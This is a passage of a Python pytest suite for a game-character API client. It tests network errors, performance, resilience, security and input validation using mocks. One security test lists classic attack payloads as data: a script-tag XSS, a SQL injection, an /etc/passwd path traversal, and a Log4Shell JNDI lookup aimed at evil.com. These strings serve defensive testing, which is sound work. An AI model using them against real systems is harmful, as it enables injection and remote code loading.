    @patch('requests.Session.get')
    def test_network_error_types(self, mock_get, client):
        """Test various network error scenarios."""
        network_errors = [
            ConnectionError("Connection refused"),
            Timeout("Request timeout"),
            RequestException("Generic request error"),
        ]
        
        for error in network_errors:
            mock_get.side_effect = error
            
            with pytest.raises(type(error)):
                client.get_character(1)
            
            mock_get.reset_mock()

    # Response Time Simulation
    @patch('requests.Session.get')
    def test_simulated_slow_response(self, mock_get, client):
        """Test handling of slow response simulation."""
        import time
        
        def slow_response(*args, **kwargs):
            time.sleep(0.1)  # Simulate network delay
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"id": 1, "name": "Test"}
            mock_response.raise_for_status.return_value = None
            return mock_response
        
        mock_get.side_effect = slow_response
        
        start_time = time.time()
        result = client.get_character(1)
        end_time = time.time()
        
        assert result["id"] == 1
        assert end_time - start_time >= 0.1  # Verify delay occurred


# Performance and Load Testing
class TestCharacterClientPerformance:
    """Performance-focused tests for CharacterClient."""

    @pytest.fixture
    def performance_client(self):
        """Client configured for performance testing."""
        return CharacterClient(
            base_url="https://api.test.com", 
            api_key="perf_test_key",
            timeout=5
        )

    @patch('requests.Session.get')
    def test_bulk_character_retrieval_performance(self, mock_get, performance_client):
        """Test performance characteristics of bulk character retrieval."""
        # Simulate large response
        large_character_list = [
            {"id": i, "name": f"Character {i}", "level": i % 100 + 1}
            for i in range(10000)
        ]
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = large_character_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = performance_client.get_all_characters(limit=10000)
        
        assert len(result) == 10000
        assert result[0]["id"] == 0
        assert result[9999]["id"] == 9999

    def test_memory_usage_character_creation(self, performance_client):
        """Test memory usage patterns during character creation."""
        import sys
        
        initial_size = sys.getsizeof(performance_client.__dict__)
        
        # Create multiple characters (mocked)
        with patch('requests.Session.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 201
            mock_response.json.return_value = {"id": 1, "name": "Test"}
            mock_response.raise_for_status.return_value = None
            mock_post.return_value = mock_response
            
            for i in range(100):
                performance_client.create_character({"name": f"Test {i}", "class": "Warrior"})
        
        final_size = sys.getsizeof(performance_client.__dict__)
        
        # Object size should not grow significantly with usage
        assert final_size <= initial_size * 1.1  # Allow for 10% growth


# Error Recovery and Resilience Testing
class TestCharacterClientResilience:
    """Tests for error recovery and resilience."""

    @pytest.fixture
    def resilient_client(self):
        """Client for resilience testing."""
        return CharacterClient(base_url="https://api.test.com", timeout=10)

    @patch('requests.Session.get')
    def test_partial_response_handling(self, mock_get, resilient_client):
        """Test handling of partial/incomplete responses."""
        # Simulate incomplete character data
        incomplete_character = {
            "id": 1,
            "name": "Incomplete Character"
            # Missing class, level, stats, etc.
        }
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = incomplete_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = resilient_client.get_character(1)
        
        # Should still return the partial data
        assert result == incomplete_character
        assert "name" in result
        assert "class" not in result

    @patch('requests.Session.get')
    def test_malformed_json_response_handling(self, mock_get, resilient_client):
        """Test handling of malformed JSON responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Malformed JSON", "response", 0)
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        with pytest.raises(json.JSONDecodeError):
            resilient_client.get_character(1)

    @patch('requests.Session.get')
    def test_unexpected_response_structure(self, mock_get, resilient_client):
        """Test handling of unexpected response structures."""
        # Response that's a list instead of expected dict
        unexpected_response = [{"id": 1, "name": "Test"}]
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = unexpected_response
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = resilient_client.get_character(1)
        
        # Should return whatever the API returns
        assert result == unexpected_response
        assert isinstance(result, list)


# Input Sanitization and Security Tests
class TestCharacterClientSecurity:
    """Security-focused tests for CharacterClient."""

    @pytest.fixture
    def security_client(self):
        """Client for security testing."""
        return CharacterClient(base_url="https://api.test.com", api_key="security_key")

    @pytest.mark.parametrize("malicious_input", [
        {"name": "<script>alert('xss')</script>", "class": "Warrior"},
        {"name": "'; DROP TABLE characters; --", "class": "Mage"},
        {"name": "Test", "class": "../../etc/passwd"},
        {"name": "${jndi:ldap://evil.com/a}", "class": "Warrior"},
        {"name": "Test", "class": "\x00\x01\x02\x03"},  # Null bytes
    ])
    @patch('requests.Session.post')
    def test_malicious_input_handling(self, mock_post, security_client, malicious_input):
        """Test handling of potentially malicious input data."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = malicious_input
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        # Should not raise errors and pass data as-is to API
        result = security_client.create_character(malicious_input)
        assert result == malicious_input

    def test_api_key_header_format(self, security_client):
        """Test that API key is properly formatted in Authorization header."""
        auth_header = security_client.session.headers.get("Authorization")
        assert auth_header == "Bearer security_key"
        assert auth_header.startswith("Bearer ")

    @patch('requests.Session.get')
    def test_unauthorized_access_simulation(self, mock_get, security_client):
        """Test simulation of unauthorized access scenarios."""
        mock_response = Mock()
        mock_response.status_code = 401
        mock_response.raise_for_status.side_effect = HTTPError("401 Unauthorized: Invalid token")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="401 Unauthorized"):
            security_client.get_character(1)


# Data Type and Schema Validation Tests  
class TestCharacterClientDataValidation:
    """Tests for data type and schema validation."""

    @pytest.fixture
    def validation_client(self):
        """Client for data validation testing."""
        return CharacterClient(base_url="https://api.test.com")

    @pytest.mark.parametrize("character_data,should_pass", [
        ({"name": "Valid", "class": "Warrior"}, True),
        ({"name": "", "class": "Warrior"}, False),  # Empty name
        ({"name": None, "class": "Warrior"}, False),  # None name
        ({}, False),  # Empty object
        ({"class": "Warrior"}, False),  # Missing name
        ({"name": "Test"}, True),  # Missing class (might be optional)
    ])
    def test_character_data_validation_rules(self, validation_client, character_data, should_pass):
        """Test character data validation rules."""
        if should_pass:
            with patch('requests.Session.post') as mock_post:
                mock_response = Mock()
                mock_response.status_code = 201
                mock_response.json.return_value = character_data
                mock_response.raise_for_status.return_value = None
                mock_post.return_value = mock_response
                
                result = validation_client.create_character(character_data)
                assert result == character_data
        else:
            with pytest.raises(ValueError):
                validation_client.create_character(character_data)

    @pytest.mark.parametrize("search_criteria", [
        {},  # No criteria
        {"name": None, "character_class": None},  # All None
        {"level_min": None, "level_max": None},  # All None levels
    ])
    def test_search_validation_empty_criteria(self, validation_client, search_criteria):
        """Test search validation with empty or None criteria."""
        with pytest.raises(ValueError, match="At least one search criterion must be provided"):
            validation_client.search_characters(**search_criteria)


if __name__ == '__main__':
    # Run all tests with verbose output and coverage
    pytest.main([__file__, '-v', '--tb=short', '--cov=character_client'])